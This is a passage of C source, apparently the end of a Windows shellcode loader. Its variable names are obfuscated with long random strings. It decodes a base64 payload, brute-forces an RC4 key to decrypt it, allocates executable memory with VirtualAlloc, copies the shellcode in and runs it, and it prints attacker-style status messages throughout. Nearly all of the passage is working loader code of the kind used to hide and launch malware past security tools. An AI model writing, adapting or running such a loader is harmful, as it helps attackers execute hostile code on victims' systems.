    printf("[~] Decoding base64 payload\n");
    int lxKcjUFbWHkbHD9JOEiVCaKlmR3yPXyU1zhndFrfxDNbZCUTU6WHUTg2O73L2LY = a1OPvGmASVoW4J99UxvUM4Y(skpEYVo4jEJrKBjMpUVe8csDD53Ze84Q2BmS6S3i8RTXL4Rbar18RT_vvX7xICksJBuVfMwojvrm_EnbbH37gBAZcjc6zPTQj1ddfmIaRnteLgdRMq8RRG0KQpnfFN_bOQSVoKS7_SyCkzps9ymP6BhCeUUeUxi73Bui7q0d2qOz4JikshM2cmhufiKEFPqps7T9KIh, bp8mitSf2Ntplq05oCe8WZJs5ZYLWWwMo51wh2MUJoYmhQ_tZL9nC0F8DMUdiJIYSvbb, X4ORzBys6U6ZsClgNgOWLNbgKbMxNuTbojRA_7plNOm0MLPxPu3Jgbm5NL_iQXMyWMCnJBxVezCBmNJb36nVbYuqqmMt_LOrWCb1RK1eajfTPWnk_Antuaszlqt54PjXiX9LUsHJzQTmh4o8hK64lyPuhdAwXGWjb4Ee22Tj37pZ2yAp65YrqR2CV7owaIzI_s1HsGup64oX0gXAqHLq8HC_y7DCy6GQ6zb_OW6vP9_);
    if (lxKcjUFbWHkbHD9JOEiVCaKlmR3yPXyU1zhndFrfxDNbZCUTU6WHUTg2O73L2LY <= 0) {
        printf("[x] Base64 decode failed\n");
        return 1;
    }
    printf("[+] Base64 decoded: %d bytes\n", lxKcjUFbWHkbHD9JOEiVCaKlmR3yPXyU1zhndFrfxDNbZCUTU6WHUTg2O73L2LY);
    
    printf("[~] Starting RC4 key bruteforce\n");
    
    
    memset(key, 0, sizeof(key));
    if (pudJCnqETeg7XQE2mRttBQqcrxh3dzCDSDyDctrcTKRm9ZSNrKjtH9xOUrO7_Qtmyb91tGsI_V4It19LCHf5_su_89xYQU5iJLyafsspsiB39zSeq1P3yjcpUFM8748zZvkR1lP4QdPNmocXmk4UgTLYZ79xLtRP_b7_ohI4vjCe1v7mzaG5PfsnJC7wYgeiAjzTJ(key, 0, KEY_SIZE, X4ORzBys6U6ZsClgNgOWLNbgKbMxNuTbojRA_7plNOm0MLPxPu3Jgbm5NL_iQXMyWMCnJBxVezCBmNJb36nVbYuqqmMt_LOrWCb1RK1eajfTPWnk_Antuaszlqt54PjXiX9LUsHJzQTmh4o8hK64lyPuhdAwXGWjb4Ee22Tj37pZ2yAp65YrqR2CV7owaIzI_s1HsGup64oX0gXAqHLq8HC_y7DCy6GQ6zb_OW6vP9_, lxKcjUFbWHkbHD9JOEiVCaKlmR3yPXyU1zhndFrfxDNbZCUTU6WHUTg2O73L2LY, WiJEkVOeJF0XDQ0ZBTQZ1y7X_ZDfZNfdM4VsHpXq1CjhHGFXwrNWYn8kCUjMPjaRS09qulvXJVeqlYJemLAwXI8KvdtU98PjKRjnwFgzKI8C72DE9ye5fsi1lrrVkmeSLUHmr5sswBcPYzaAznT9AlJAHwYlUdt2DFDluZElOeIlpp_QblJ9g3RDq4PcXlIenO, &yyjBgCbb4Px0JsAeX5GnTk5cK8oEmwSZENlRJtvtYjDbPxlYduV0OWox62VWADtJgq8HWUeu2lhM6kH6_ja1IColh7Jxv3yrMGrCivdRiNo1L0uegtYWIkMgp8tIEyN7aWrUtSmBdBmjTDrDK6YJdXzSrFPgTAlTtKf74W9WsmPrSIFSA2KDWdGy)) {
        hOeZhEI2zEhBWhrOhggz9Y61vnFkU6Wbl6QrQHf_KzFuhC4X2zRm3rt81WqJnVUFpdH2LyuGC9uzZFwFKhycO = 1;
    }
    
    if (hOeZhEI2zEhBWhrOhggz9Y61vnFkU6Wbl6QrQHf_KzFuhC4X2zRm3rt81WqJnVUFpdH2LyuGC9uzZFwFKhycO && yyjBgCbb4Px0JsAeX5GnTk5cK8oEmwSZENlRJtvtYjDbPxlYduV0OWox62VWADtJgq8HWUeu2lhM6kH6_ja1IColh7Jxv3yrMGrCivdRiNo1L0uegtYWIkMgp8tIEyN7aWrUtSmBdBmjTDrDK6YJdXzSrFPgTAlTtKf74W9WsmPrSIFSA2KDWdGy > 0) {
        printf("[+] Payload decrypted successfully: %d bytes\n", yyjBgCbb4Px0JsAeX5GnTk5cK8oEmwSZENlRJtvtYjDbPxlYduV0OWox62VWADtJgq8HWUeu2lhM6kH6_ja1IColh7Jxv3yrMGrCivdRiNo1L0uegtYWIkMgp8tIEyN7aWrUtSmBdBmjTDrDK6YJdXzSrFPgTAlTtKf74W9WsmPrSIFSA2KDWdGy);
        printf("[~] Allocating executable memory\n");
        
        
        void *AebisMhqNb9b = VirtualAlloc(0, yyjBgCbb4Px0JsAeX5GnTk5cK8oEmwSZENlRJtvtYjDbPxlYduV0OWox62VWADtJgq8HWUeu2lhM6kH6_ja1IColh7Jxv3yrMGrCivdRiNo1L0uegtYWIkMgp8tIEyN7aWrUtSmBdBmjTDrDK6YJdXzSrFPgTAlTtKf74W9WsmPrSIFSA2KDWdGy, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (AebisMhqNb9b) {
            printf("[+] Memory allocated at: %p\n", AebisMhqNb9b);
            printf("[~] Copying shellcode to memory\n");
            memcpy(AebisMhqNb9b, WiJEkVOeJF0XDQ0ZBTQZ1y7X_ZDfZNfdM4VsHpXq1CjhHGFXwrNWYn8kCUjMPjaRS09qulvXJVeqlYJemLAwXI8KvdtU98PjKRjnwFgzKI8C72DE9ye5fsi1lrrVkmeSLUHmr5sswBcPYzaAznT9AlJAHwYlUdt2DFDluZElOeIlpp_QblJ9g3RDq4PcXlIenO, yyjBgCbb4Px0JsAeX5GnTk5cK8oEmwSZENlRJtvtYjDbPxlYduV0OWox62VWADtJgq8HWUeu2lhM6kH6_ja1IColh7Jxv3yrMGrCivdRiNo1L0uegtYWIkMgp8tIEyN7aWrUtSmBdBmjTDrDK6YJdXzSrFPgTAlTtKf74W9WsmPrSIFSA2KDWdGy);
            printf("[~] Executing shellcode\n");
            ((void(*)())(AebisMhqNb9b))();
        } else {
            printf("[x] Memory allocation failed\n");
        }
    } else {
        printf("[x] Failed to decrypt payload\n");
    }
    
    return 0;
}